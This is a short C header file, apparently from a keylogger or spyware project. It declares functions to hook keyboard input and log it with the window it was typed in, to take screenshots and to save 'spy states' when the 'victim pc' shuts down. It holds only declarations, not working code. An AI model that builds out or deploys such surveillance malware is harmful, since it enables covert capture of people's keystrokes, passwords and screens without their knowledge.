#pragma once
#include "spy.h"

// this function must be call to release resources and save
// spy states when victim pc is shutdowning
EXPORT VOID quit();
// process keyboard hook data such as get key code, get window
// which typed on, saving to hook file blablabla...
VOID process_kb_hook_data(WPARAM wParam, LPARAM lParam);
EXPORT VOID take_screenshot();